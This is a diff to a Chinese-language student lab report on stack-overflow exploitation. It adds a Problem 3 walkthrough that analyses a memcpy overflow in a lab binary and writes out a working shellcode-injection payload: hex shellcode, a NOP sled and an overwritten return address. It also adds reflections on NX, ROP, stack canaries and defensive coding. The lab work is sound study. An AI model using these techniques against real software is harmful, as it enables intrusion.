@@ -28,7 +28,8 @@
      - payload结构：8字节填充 + 8字节saved_rbp + 8字节func1地址
 
 - **解决方案**：
-```pythonpadding = b"A" * 8  # 覆盖从rbp-8到rbp的8字节
+```python
+padding = b"A" * 8  # 覆盖从rbp-8到rbp的8字节
 saved_rbp = b"B" * 8  # 覆盖保存的rbp（可以是任意值）
 func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # func1地址0x401216，小端序
 
@@ -97,9 +98,71 @@ with open("ans2.txt", "wb") as f:
 
 ### Problem 3: 
 - **分析**：
+  1. 阅读汇编代码发现，`func`函数（地址0x401355）存在栈溢出漏洞：
+     - 函数分配了0x30（48字节）的栈空间（`sub $0x30,%rsp`）
+     - 缓冲区位于`rbp-0x20`位置（32字节）
+     - 使用`memcpy`函数复制0x40（64字节）的数据到缓冲区，明显超过了分配空间
+     - 会将当前`rsp`保存到全局变量`saved_rsp`（地址0x403510）
   
+  2. 栈布局分析：
+     - 缓冲区大小：32字节（rbp-0x20 到 rbp）
+     - saved rbp：8字节
+     - 返回地址：8字节
+     - 总共40字节可被覆盖，而memcpy复制64字节，存在24字节溢出
+  
+  3. 目标函数`func1`（地址0x401216）：
+     - 接受一个参数（通过edi寄存器）
+     - 检查参数是否等于0x72（114）
+     - 如果参数等于0x72，则打印"Your lucky number is 114"
+  
+  4. 保护机制分析：
+     - 本题**无NX保护**，栈可执行
+     - 可以在栈上注入shellcode并执行
+  
+  5. 攻击思路：
+     - 在缓冲区开头放入shellcode
+     - 覆盖返回地址为缓冲区起始地址
+     - shellcode执行`func1(0x72)`来输出幸运数字114
+  
+  6. 运行时地址获取（需关闭栈随机化）：
+     - 使用GDB在`memcpy`之后设置断点，获取`saved_rsp`值
+     - `saved_rsp = 0x7fffffffd810`（rsp值）
+     - `rbp = saved_rsp + 0x30 = 0x7fffffffd840`
+     - `缓冲区地址 = rbp - 0x20 = 0x7fffffffd820`
+  
+  7. Shellcode设计（12字节）：
+     ```asm
+     mov $0x72, %edi       # bf 72 00 00 00     (5 bytes) - 设置参数=114
+     mov $0x401216, %eax   # b8 16 12 40 00     (5 bytes) - func1地址
+     jmp *%rax             # ff e0              (2 bytes) - 跳转到func1
+     ```
+
 - **解决方案**：
-  
+```python
+# Shellcode: 调用 func1(0x72) 来输出 "Your lucky number is 114"
+shellcode = b"\xbf\x72\x00\x00\x00"  # mov $0x72, %edi
+shellcode += b"\xb8\x16\x12\x40\x00"  # mov $0x401216, %eax
+shellcode += b"\xff\xe0"              # jmp *%rax
+# 共12字节
+
+# Payload布局:
+# 字节 0-11:  shellcode (12字节)
+# 字节 12-31: NOP填充 (20字节)
+# 字节 32-39: 假的 saved rbp (8字节)
+# 字节 40-47: 返回地址 = 缓冲区地址 0x7fffffffd820
+
+padding = b"\x90" * 20  # NOP sled
+fake_rbp = b"B" * 8     # 假的saved rbp
+buffer_addr = b"\x20\xd8\xff\xff\xff\x7f\x00\x00"  # 0x7fffffffd820 小端序
+
+payload = shellcode + padding + fake_rbp + buffer_addr
+extra_padding = b"\x00" * (64 - len(payload))
+payload += extra_padding
+
+with open("ans3.txt", "wb") as f:
+    f.write(payload)
+```
+
 - **结果**：
 ![](./imgs/result3.png)
 
@@ -144,7 +207,34 @@ Canary 机制体现在函数的开头（设置）和结尾（检查）。
 
 ## 思考与总结
 
+通过本次栈溢出攻击实验，我对栈溢出漏洞的原理、利用方法以及防护机制有了更深入的理解。
 
+#### 1. 栈溢出攻击的本质
+
+栈溢出攻击的核心在于**控制程序的执行流程**。通过覆盖栈上的返回地址，攻击者可以改变程序的正常执行路径。栈帧布局是理解栈溢出的关键：局部变量位于栈帧底部，返回地址位于栈帧顶部，缓冲区溢出时会从低地址向高地址覆盖，最终可能覆盖返回地址。
+
+#### 2. 不同保护机制的特点与绕过
+
+**NX（No-Execute）保护**：Problem 2展示了当栈不可执行时，需要使用**ROP（Return-Oriented Programming）技术**来绕过保护。ROP通过利用程序中已有的代码片段（gadget），构造ROP链来串联多个gadget，最终实现攻击目标。这证明了即使栈不可执行，攻击者仍可通过重用现有代码实现攻击。
+
+**Canary保护机制**：Problem 4展示了Stack Canary保护机制。Canary在函数开始时从`%fs:0x28`读取随机值存入栈中，在函数返回前检查其是否被修改。然而，如果攻击者能通过逻辑漏洞实现攻击目标而不需要覆盖返回地址，Canary保护就会失效，这提醒我们安全防护需要多层次考虑。
+
+#### 3. 技术要点与收获
+
+- **Shellcode注入**：在栈可执行环境下，需要编写精简的汇编代码，并准确获取栈地址。
+- **地址表示**：64位x86-64架构采用小端序存储，构造payload时需要正确转换地址格式。
+- **栈布局计算**：准确计算缓冲区位置、saved rbp和返回地址的位置是成功利用的关键。
+- **调试工具**：GDB等调试工具在获取运行时信息、验证攻击效果方面至关重要。
+
+#### 4. 安全防护的思考
+
+通过本次实验，我认识到：
+
+1. **安全是系统工程**：单一保护机制（如NX或Canary）无法完全防止攻击，需要多层防护措施配合使用。
+
+2. **代码审计的重要性**：栈溢出漏洞往往源于不安全的函数使用（如`strcpy`、`memcpy`没有长度检查）。开发时应使用安全函数、进行边界检查、使用静态分析工具。
+
+3. **防护机制的局限性**：NX可被ROP绕过，Canary可被逻辑漏洞绕过，ASLR增加了攻击难度但并非绝对安全。现代系统需要组合使用编译时保护（Canary、NX、PIE）、运行时保护（ASLR、DEP）和系统级保护（SELinux、AppArmor）。
 
 ## 参考资料
 
